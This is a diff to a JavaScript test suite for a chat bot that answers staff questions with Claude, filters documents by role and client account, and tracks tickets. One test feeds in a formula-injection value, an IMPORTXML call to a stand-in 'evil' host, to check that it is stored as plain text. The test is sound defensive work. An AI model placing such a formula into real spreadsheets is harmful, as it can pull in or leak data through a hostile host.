@@ -31,8 +31,8 @@ function setupEnv() {
     ['verge@inava.test', 'Verge', 'HR', '', 'YES', 'users/4', 'spaces/dm-verge'],
     ['pay@inava.test', 'Pat Payroll', 'HR', '', 'YES', 'users/5', 'spaces/dm-pay'],
     ['va@inava.test', 'Vicky VA', 'VA', 'Acme', 'YES', 'users/6', ''],
-    ['client@acme.test', 'Alex Acme', 'CLIENT', 'Acme', 'YES', 'users/7', ''],
-    ['client@other.test', 'Olive Other', 'CLIENT', 'Other', 'YES', 'users/8', ''],
+    ['va2@inava.test', 'Andy (Acme VA)', 'VA', 'Acme', 'YES', 'users/7', ''],
+    ['va3@inava.test', 'Olive (Other VA)', 'VA', 'Other', 'YES', 'users/8', ''],
     ['gone@inava.test', 'Gone', 'VA', '', 'NO', '', ''],
   ].forEach((r) => users.push([...r, '']));
 
@@ -50,7 +50,7 @@ function setupEnv() {
     ['VA Handbook', DOC(1), 'VA, HR, MANAGEMENT', '', 'Approved'],
     ['Client FAQ', DOC(2), 'ALL', '', 'Approved'],
     ['Management Playbook', DOC(3), 'MANAGEMENT', '', 'Approved'],
-    ['Acme Service Agreement', DOC(4), 'CLIENT, VA, MANAGEMENT', 'Acme', 'Approved'],
+    ['Acme Service Agreement', DOC(4), 'VA, MANAGEMENT', 'Acme', 'Approved'],
     ['Old Policy', DOC(5), 'ALL', '', 'Retired'],
   ].forEach((r) => kb.push([...r, '', '']));
   env.docs['doc1xxxxxxxxxxxxxxxxxxxxxx'] = 'Leave: request 2 weeks ahead via the leave form.';
@@ -60,7 +60,7 @@ function setupEnv() {
   env.docs['doc5xxxxxxxxxxxxxxxxxxxxxx'] = 'Retired policy text.';
 
   const spaces = env.sheet('Spaces');
-  spaces.push(['spaces/acme', 'Acme Client Space', 'YES', 'CLIENT', 'Acme', toSerial(new Date()), '']);
+  spaces.push(['spaces/acme', 'Acme VA Team', 'YES', 'VA', 'Acme', toSerial(new Date()), '']);
   spaces.push(['spaces/team', 'INAVA Team', 'YES', 'MANAGEMENT', '', toSerial(new Date()), '']);
   return env;
 }
@@ -129,7 +129,7 @@ test('setup creates every tab with headers and seeds routing; running it twice i
 test('text that looks like a formula is stored as plain text', () => {
   const env = setupEnv();
   claudeReturns(env, answer({ escalate: true, category: 'CLIENT_CARE', concern_summary: '=IMPORTXML("http://evil")' }));
-  env.ctx.onMessage(dmEvent('client@acme.test', 'users/7', 'x'));
+  env.ctx.onMessage(dmEvent('va2@inava.test', 'users/7', 'x'));
   assert.strictEqual(ticketRows(env)[0].Summary, '=IMPORTXML("http://evil")');
   const row = env.sheet('Tickets')[1];
   assert.strictEqual(typeof row[12], 'number', 'Created is stored as a real date');
@@ -143,6 +143,13 @@ test('unregistered and inactive people get no AI answer', () => {
   r = env.ctx.onMessage(dmEvent('gone@inava.test', 'users/9', 'hello'));
   assert.match(r.text, /approved list/);
   assert.strictEqual(env.sent.claude.length, 0);
+});
+
+test('new spaces default to the VA audience', () => {
+  const env = setupEnv();
+  env.ctx.onAddedToSpace({ type: 'ADDED_TO_SPACE', user: { email: 'britt@inava.test' },
+    space: { name: 'spaces/x', type: 'ROOM', displayName: 'X' } });
+  assert.strictEqual(env.sheet('Spaces').find((r) => r[0] === 'spaces/x')[3], 'VA');
 });
 
 test('bot is silent in spaces that are not approved', () => {
@@ -185,20 +192,20 @@ test('Claude request is well formed (model, version, structured output, fallback
   assert.ok(!('temperature' in req.body));
 });
 
-test('manager asking in a client space only gets client-safe docs for that client', () => {
+test('manager asking in a VA space only gets VA-safe docs for that space\'s client', () => {
   const env = setupEnv();
   claudeReturns(env, answer({}));
   env.ctx.onMessage(spaceEvent('cyn@inava.test', 'users/2', 'spaces/acme', 'What are Acme hours?'));
-  assert.deepStrictEqual(kbSent(env).sort(), ['Acme Service Agreement', 'Client FAQ']);
+  assert.deepStrictEqual(kbSent(env).sort(), ['Acme Service Agreement', 'Client FAQ', 'VA Handbook']);
 });
 
-test('a client never gets another client\'s documents', () => {
+test('a VA never gets documents for a client account they do not work on', () => {
   const env = setupEnv();
   claudeReturns(env, answer({}));
-  env.ctx.onMessage(dmEvent('client@other.test', 'users/8', 'What hours do I get?'));
-  assert.deepStrictEqual(kbSent(env), ['Client FAQ']);
-  env.ctx.onMessage(dmEvent('client@acme.test', 'users/7', 'What hours do I get?'));
-  assert.deepStrictEqual(kbSent(env).sort(), ['Acme Service Agreement', 'Client FAQ']);
+  env.ctx.onMessage(dmEvent('va3@inava.test', 'users/8', 'What hours does my client get?'));
+  assert.deepStrictEqual(kbSent(env).sort(), ['Client FAQ', 'VA Handbook']);
+  env.ctx.onMessage(dmEvent('va2@inava.test', 'users/7', 'What hours does my client get?'));
+  assert.deepStrictEqual(kbSent(env).sort(), ['Acme Service Agreement', 'Client FAQ', 'VA Handbook']);
 });
 
 test('management in an internal space sees the management playbook', () => {
@@ -214,7 +221,7 @@ test('client care concern opens a ticket and privately notifies Cyn', () => {
   claudeReturns(env, answer({ reply: 'I am sorry to hear that. I have passed this on.', escalate: true,
     category: 'CLIENT_CARE', priority: 'HIGH', concern_summary: 'Client unhappy with VA response times.',
     recommended_action: 'Call the client today.' }));
-  const r = env.ctx.onMessage(spaceEvent('client@acme.test', 'users/7', 'spaces/acme', 'My VA is always late replying'));
+  const r = env.ctx.onMessage(spaceEvent('va2@inava.test', 'users/7', 'spaces/acme', 'My client is unhappy with response times'));
   assert.match(r.text, /Reference: \*INAVA-\d{6}-001\*/);
   const t = ticketRows(env)[0];
   assert.strictEqual(t.Status, 'Assigned');
@@ -268,7 +275,7 @@ test('assignee without a DM space: ticket stays New and the reply says logged', 
   const cyn = env.sheet('Users').find((u) => u[0] === 'cyn@inava.test');
   cyn[5] = ''; cyn[6] = '';
   claudeReturns(env, answer({ escalate: true, category: 'CLIENT_CARE', concern_summary: 'x' }));
-  const r = env.ctx.onMessage(dmEvent('client@acme.test', 'users/7', 'problem'));
+  const r = env.ctx.onMessage(dmEvent('va2@inava.test', 'users/7', 'problem'));
   assert.strictEqual(ticketRows(env)[0].Status, 'New');
   assert.match(r.text, /logged for the INAVA team/);
 });
@@ -276,7 +283,7 @@ test('assignee without a DM space: ticket stays New and the reply says logged', 
 test('ticket commands: assignee can update, others cannot, and never in a space', () => {
   const env = setupEnv();
   claudeReturns(env, answer({ escalate: true, category: 'CLIENT_CARE', concern_summary: 'x' }));
-  env.ctx.onMessage(dmEvent('client@acme.test', 'users/7', 'problem'));
+  env.ctx.onMessage(dmEvent('va2@inava.test', 'users/7', 'problem'));
   const id = ticketRows(env)[0]['Ticket ID'];
   const before = env.sent.claude.length;
 
@@ -289,7 +296,7 @@ test('ticket commands: assignee can update, others cannot, and never in a space'
   assert.match(ticketRows(env)[0].History, /In Progress by Cyn: called them/);
   r = env.ctx.onMessage(dmEvent('cyn@inava.test', 'users/2', 'my tickets'));
   assert.match(r.text, new RegExp(id));
-  r = env.ctx.onMessage(dmEvent('client@acme.test', 'users/7', 'ticket ' + id));
+  r = env.ctx.onMessage(dmEvent('va2@inava.test', 'users/7', 'ticket ' + id));
   assert.match(r.text, /currently: \*In Progress\*/);
   r = env.ctx.onMessage(dmEvent('cyn@inava.test', 'users/2', 'status ' + id + ' resolved'));
   assert.strictEqual(ticketRows(env)[0].Status, 'Resolved');
@@ -301,7 +308,7 @@ test('ticket commands: assignee can update, others cannot, and never in a space'
 test('overdue reminders: assignee reminded, Operations told after repeated reminders', () => {
   const env = setupEnv();
   claudeReturns(env, answer({ escalate: true, category: 'CLIENT_CARE', priority: 'HIGH', concern_summary: 'x' }));
-  env.ctx.onMessage(dmEvent('client@acme.test', 'users/7', 'problem'));
+  env.ctx.onMessage(dmEvent('va2@inava.test', 'users/7', 'problem'));
   const tickets = env.sheet('Tickets');
   const h = tickets[0];
   const row = tickets[1];
